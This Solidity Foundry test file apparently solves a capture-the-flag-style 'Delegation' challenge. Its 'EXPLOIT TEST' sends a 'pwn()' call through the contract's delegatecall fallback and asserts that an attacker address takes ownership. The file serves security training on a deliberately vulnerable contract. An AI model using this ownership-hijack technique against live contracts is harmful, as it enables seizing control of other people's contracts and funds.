//SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {Delegation,Delegate} from "../src/Delegation.sol";
import {DelegationDeploy} from "../script/DelegationDeploy.s.sol";

contract DelegationTest is Test {

    Delegation delegation;
    Delegate delegate;
    DelegationDeploy deploy;

    address spider = makeAddr("spider");

    function setUp() public{
        deploy = new DelegationDeploy();
        delegation = deploy.run();
        delegate = Delegate(deploy.delegate());
    }


    function testCurrentOwner() public {
        console.log("Current Owner", delegate.owner());
    }

    /*//////////////////////////////////////////////////////////////
                              EXPLOIT TEST
    //////////////////////////////////////////////////////////////*/

    function testChangeOwner() public {
        //Arrange
        address initialOwner = delegation.owner();
        console.log("The Initial address: ", initialOwner);
        //Act 
        vm.startPrank(spider);
        (bool s,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(s, "failed");
        vm.stopPrank();

        address finalOwner = delegation.owner();
        console.log("New Delegation Owner: ", finalOwner);
        console.log("Spider Address: ", spider);

        //Assert 
        assertEq(finalOwner, spider);
        

    }


}